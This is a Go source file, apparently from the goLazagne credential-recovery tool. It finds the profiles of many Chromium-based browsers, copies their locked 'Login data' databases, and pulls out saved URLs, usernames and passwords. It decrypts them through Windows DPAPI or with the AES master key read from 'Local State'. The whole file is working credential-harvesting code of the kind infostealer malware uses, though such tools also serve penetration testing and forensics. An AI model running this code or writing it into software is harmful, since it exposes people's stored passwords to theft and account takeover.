package browsers

import (
	"database/sql"
	"fmt"
	"github.com/buger/jsonparser"
	"github.com/kerbyj/goLazagne/common"
	_ "github.com/mattn/go-sqlite3"
	"io/ioutil"
	"log"
	"os"
	"strings"
)

func chromeModuleStart(path string) ([]common.UrlNamePass, bool) {
	if _, err := os.Stat(path + "\\Local State"); err == nil {
		fileWithUserData, err := ioutil.ReadFile(path + "\\Local state")
		if err != nil {
			return nil, false
		}
		profilesWithTrash, _, _, _ := jsonparser.Get(fileWithUserData, "profile")

		var profileNames []string

		//todo delete this piece of... is there a more smartly way?
		jsonparser.ObjectEach(profilesWithTrash, func(key []byte, value []byte, dataType jsonparser.ValueType, offset int) error {
			profileNames = append(profileNames, string(key))
			return nil
		}, "info_cache")

		// Create temporary databases for bypass locking
		//var temporaryDbNames []string
		//data := make([]common.UrlNamePass, 0)
		var data []common.UrlNamePass
		for _, profileName := range profileNames {
			dbPath := fmt.Sprintf("%s\\%s\\Login data", path, profileName)
			if _, err := os.Stat(dbPath); err == nil {
				// Copy tmp db
				file, _ := ioutil.TempFile(os.TempDir(), "prefix")
				err := common.CopyFile(dbPath, file.Name())
				if err != nil {
					log.Fatalln("CopyFile", err.Error())
					return nil, false
				}
				tmpDB := file.Name()

				fmt.Println("====", dbPath)

				// Get passwords
				_data, _ := _export_credentials(tmpDB, path)
				data = append(data, _data...)
				//temporaryDbNames = append(temporaryDbNames, file.Name())
			}
		}
		//log.Println("temporaryDbNames", temporaryDbNames)
		//for _, tmpDB := range temporaryDbNames {
		//}

		return data, true
		// remove already used database
	}
	return nil, false
}
func _export_credentials(tmpDB string, path string) ([]common.UrlNamePass, bool) {
	db, err := sql.Open("sqlite3", tmpDB)
	if err != nil {
		log.Fatalln("Open sqlite3", err.Error())
		return nil, false
	}
	//sqlite3.Open(tmpDB)
	//db, err := sqlite3.Open("test.sqlite")
	//if err != nil {
	//	panic(err)
	//}
	//defer db.Close()
	rows, err := db.Query("SELECT action_url, username_value, password_value FROM logins")
	//fmt.Println("rows", rows)
	if err != nil {
		log.Fatalln("sql error", err.Error())
		return nil, false
	}
	var actionUrl, username, password string
	var data []common.UrlNamePass

	for rows.Next() {
		rows.Scan(&actionUrl, &username, &password)
		//fmt.Println("actionUrl", actionUrl, username, password)
		/*
			Chromium browser use default win cryptapi function named "CryptProtectData" for encrypting saved credentials.
			Read about DPAPI for more information.
		*/
		if password != "" && strings.HasPrefix(password, "v10") {
			//keyFilePath := os.Getenv("USERPROFILE") + "/AppData/Local/Google/Chrome/User Data/Local State"
			//masterKey, err := common.GetMasterkey(keyFilePath)
			//if err != nil {
			//	log.Fatalln("GetMasterkey", err.Error())
			//	return nil, false
			//}

			keyFilePath := fmt.Sprintf("%s\\Local State", path)
			masterKey, err := common.GetMasterkey(keyFilePath)
			if err != nil {
				log.Println("GetMasterkey", err.Error())
				return nil, false
			}
			//newVersionPassword, errAesDecrypt := common.DecryptAESPwd([]byte(password), masterKey)
			newVersionPassword, errAesDecrypt := _decrypt_v80(password, masterKey)
			if errAesDecrypt != nil {
				log.Fatalln("DecryptAESPwd", errAesDecrypt.Error())
			}
			//fmt.Println("newVersionPassword", newVersionPassword)
			data = append(data, common.UrlNamePass{
				Url:      actionUrl,
				Username: username,
				Pass:     newVersionPassword,
			})
		} else {
			decryptedPassword, errUnprotectData := common.Win32CryptUnprotectData(password, false)
			//fmt.Println("decryptedPassword", decryptedPassword, errUnprotectData.Error())
			if errUnprotectData != nil {
				log.Fatalln("Win32CryptUnprotectData error", errUnprotectData.Error())
			}

			data = append(data, common.UrlNamePass{
				Url:      actionUrl,
				Username: username,
				Pass:     string(decryptedPassword),
			})
		}
	}

	//if errUnprotectData != nil {
	//	// Chrome v80+ creds extract
	//	//if strings.Contains(path, "\\Google\\Chrome\\User Data") {
	//
	//		keyFilePath := os.Getenv("USERPROFILE") + "/AppData/Local/Google/Chrome/User Data/Local State"
	//		masterKey, err := common.GetMasterkey(keyFilePath)
	//		if err != nil {
	//			log.Fatalln("GetMasterkey", err.Error())
	//			return nil, false
	//		}
	//
	//		//newVersionPassword, errAesDecrypt := common.DecryptAESPwd([]byte(password), masterKey)
	//		newVersionPassword, errAesDecrypt := _decrypt_v80(password, masterKey)
	//
	//		if errAesDecrypt == nil {
	//			data = append(data, common.UrlNamePass{
	//				Url:      actionUrl,
	//				Username: username,
	//				Pass:     string(newVersionPassword),
	//			})
	//		} else {
	//			// failed to decrypt password with both methods
	//			data = append(data, common.UrlNamePass{
	//				Url:      actionUrl,
	//				Username: username,
	//				Pass:     "empty",
	//			})
	//		}
	//	}
	//}
	os.Remove(tmpDB)
	return data, true
}
func _decrypt_v80(password string, masterKey []byte) (string, error) {
	newVersionPassword, errAesDecrypt := common.DecryptAESPwd([]byte(password), masterKey)
	if errAesDecrypt == nil {
		return string(newVersionPassword), errAesDecrypt
	} else {
		return "??", errAesDecrypt
	}
}

var (
	/*
		Paths for more interesting and popular browsers for us
	*/
	chromePathsUserData = []string{
		//common.LocalAppData + "\\Google\\Chrome\\User Data", // Google chrome
		//common.AppData + "\\Opera Software\\Opera Stable",   // Opera
		//// common.LocalAppData + "\\Yandex\\YandexBrowser\\User Data", // Yandex browser
		//common.LocalAppData + "\\Vivaldi\\User Data",          // Vivaldi
		//common.LocalAppData + "\\CentBrowser\\User Data",      // CentBrowser
		//common.LocalAppData + "\\Amigo\\User Data",            // Amigo (RIP)
		//common.LocalAppData + "\\Chromium\\User Data",         // Chromium
		//common.LocalAppData + "\\Sputnik\\Sputnik\\User Data", // Sputnik
		common.LocalAppData + "\\7Star\\7Star\\User Data",
		common.LocalAppData + "\\Amigo\\User Data",
		common.LocalAppData + "\\BraveSoftware\\Brave-Browser\\User Data",
		common.LocalAppData + "\\CentBrowser\\User Data",
		common.LocalAppData + "\\Chedot\\User Data",
		common.LocalAppData + "\\Google\\Chrome SxS\\User Data",
		common.LocalAppData + "\\Chromium\\User Data",
		common.LocalAppData + "\\Microsoft\\Edge\\User Data",
		common.LocalAppData + "\\CocCoc\\Browser\\User Data",
		common.LocalAppData + "\\Comodo\\Dragon\\User Data",
		common.LocalAppData + "\\Elements Browser\\User Data",
		common.LocalAppData + "\\Epic Privacy Browser\\User Data",
		common.LocalAppData + "\\Google\\Chrome\\User Data",
		common.LocalAppData + "\\Kometa\\User Data",
		common.AppData + "\\Opera Software\\Opera Stable",
		common.LocalAppData + "\\Orbitum\\User Data",
		common.LocalAppData + "\\Sputnik\\Sputnik\\User Data",
		common.LocalAppData + "\\Torch\\User Data",
		common.LocalAppData + "\\uCozMedia\\Uran\\User Data",
		common.LocalAppData + "\\Vivaldi\\User Data",
	}
)

/*
Function used to extract credentials from chromium-based browsers (Google Chrome, Opera, Yandex, Vivaldi, Cent Browser, Amigo, Chromium, Sputnik).
*/
func ChromeExtractDataRun() common.ExtractCredentialsResult {
	var Result common.ExtractCredentialsResult
	var EmptyResult = common.ExtractCredentialsResult{false, Result.Data}

	var allCreds []common.UrlNamePass

	for _, ChromePath := range chromePathsUserData {
		if _, err := os.Stat(ChromePath); err == nil {

			var data, success = chromeModuleStart(ChromePath)
			//fmt.Println("data", data)
			if success && data != nil {
				allCreds = append(allCreds, data...)
			}
		}
	}

	if len(allCreds) == 0 {
		return EmptyResult
	} else {
		Result.Success = true
		return common.ExtractCredentialsResult{
			Success: true,
			Data:    allCreds,
		}
	}
}
